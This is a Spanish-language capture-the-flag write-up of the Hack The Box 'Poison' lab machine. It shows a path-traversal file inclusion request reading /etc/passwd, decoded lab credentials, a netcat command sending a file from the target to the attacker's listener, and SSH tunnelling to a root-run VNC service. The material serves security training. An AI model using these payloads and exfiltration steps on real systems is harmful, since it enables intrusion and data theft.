---
redirect_from:
  - /posts/POISON-WriteUp/

title: "Poison - WriteUp"
date: Mon Oct 21 2024 21:30:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, linpeas, apache, php, linux, ssh, bash, python]
image: /assets/img/htb-writeups/Pasted-image-20240122092228.png
---

{% include machine-info.html
  machine="Poison"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Poison](/assets/img/htb-writeups/Pasted-image-20240122092228.png)

------

![POISON](/assets/img/htb-writeups/Pasted-image-20240122092228.png)

-------

NMAP

```bash
# Nmap 7.94SVN scan initiated Mon Jan 22 09:23:26 2024 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap
.xsl -oN targeted -oX targetedXML 10.129.1.254
Nmap scan report for 10.129.1.254
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 22 09:23:36 2024 -- 1 IP address (1 host up) scanned in 9.16 seconds
```

WHATWEB

```bash
$ whatweb http://10.129.1.254
http://10.129.1.254 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.129.1.254], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```

HTTP

![POISON](/assets/img/htb-writeups/Pasted-image-20240122092736.png)

Si le introducimos por ejemplo "info.php" el resultado es el siguiente;

![POISON](/assets/img/htb-writeups/Pasted-image-20240122092925.png)

Se puede acontecer un LFI. Vamos a probarlo:

```http
http://10.129.1.254/browse.php?file=/../../../../../../../../etc/passwd
```

![POISON](/assets/img/htb-writeups/Pasted-image-20240122093242.png)

OK, vamos a probar otro archivo de la lista:

![POISON](/assets/img/htb-writeups/Pasted-image-20240122093416.png)

El archivo número 8 parece sospechoso, vamos a ver qué contiene:

![POISON](/assets/img/htb-writeups/Pasted-image-20240122093544.png)

Parece que está codificado 13 veces en base64. Vamos a descifrarlo con _Cyberchef_

Vamos a preparar un script en Python que nos coja el archivo con el contenido en base64 y nos pregunte las veces que queremos decodificarlo, así ya lo tendremos para próximos usos:

```python
#!/usr/bin/env python3
import base64
import sys

def decode_base64(data, times):
    for _ in range(times):
        data = base64.b64decode(data).decode("utf-8")
    return data

# Leer la ruta del archivo desde los argumentos de la línea de comandos
ruta_archivo = sys.argv[1]

# Leer el contenido del archivo
with open(ruta_archivo, 'r') as file:
    cadena = file.read()

# Preguntar al usuario cuántas veces quiere decodificar la cadena
times = int(input('\n¿Cuántas veces quieres decodificar la cadena? '))

# Decodificar la cadena
try:
    result = decode_base64(cadena, times)
    print("\nEl resultado es: " + result)
except Exception as e:
    print(f'Error al decodificar: {e}')
```

Y obtenemos el resultado:

![POISON](/assets/img/htb-writeups/Pasted-image-20240122095445.png)

Tenemos credenciales, ya que habíamos conseguido la lista de usuarios anteriormente:

```http
charix:Charix!2#4%6&8(0
```

Vamos a probar las credenciales por SSH:

```bash
$ ssh charix@10.129.8.164
```

Y pa dentro!

Empezamos a enumerar y vemos un archivo sospechoso además de la primera bandera:

![POISON](/assets/img/htb-writeups/Pasted-image-20240122101243.png)

Vamos a intentar traérnoslo a nuestra máquina con _NetCat_

En nuestra máquina Kali nos pondremos a la escucha con el mismo nombre de archivo:

```bash
$ nc -l -p 1234 > secret.zip
```

Y en la máquina víctima enviaremos el archivo:

```bash
% nc -w 3 10.10.14.87 1234 < secret.zip
```

Nos lo pasamos pero al intentar descomprimirlo nos pide un password, volvemos a introducir la contraseña del usuario _charix_ y parece que funciona. Pero el contenido parece cifrado o un rabbit hole.

![POISON](/assets/img/htb-writeups/Pasted-image-20240122102411.png)

Vamos a seguir enumerando la máquina víctima para ver qué encontramos.

Empecemos por los puertos o servicios en escucha, si no vemos nada, le subiremos _linpeas_

```bash
$ netstat -an | grep -i listen
```

![POISON](/assets/img/htb-writeups/Pasted-image-20240122103755.png)

Vemos que tiene dos puertos en escucha interna, que si la memoria no me falla corresponden a VNC.

Vamos a listar los procesos para ver si el servicio de VNC está levantado:

```bash
$ ps aux | grep -i vnc
```

![POISON](/assets/img/htb-writeups/Pasted-image-20240122104018.png)

Y efectivamente, es tiene corriendo un servidor de VNC internamente. Ahora vamos a traernos uno de los puertos en escucha hacia nuestra máquina para probar una conexión remota.

```bash
$ ssh -L 5901:127.0.0.1:5901 charix@10.129.8.164
```

Y ahora desde otra consola conectamos por VNC con las credenciales de Charix:

```bash
$ vncviewer 127.0.0.1:5901
```

![POISON](/assets/img/htb-writeups/Pasted-image-20240122112336.png)

Pero no funciona. Vamos a probar con el archivo descomprimido anterior mente como certificado:

```bash
$ vncviewer 127.0.0.1:5901 -passwd secret
```

![POISON](/assets/img/htb-writeups/Pasted-image-20240122112719.png)

Y estamos dentro! Como el servicio lo ejecutaba root, al entrar hemos entrado como superusuario. Registramos la flag y máquina pa la saca!
---

**Última actualización**: 2024-10-21<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
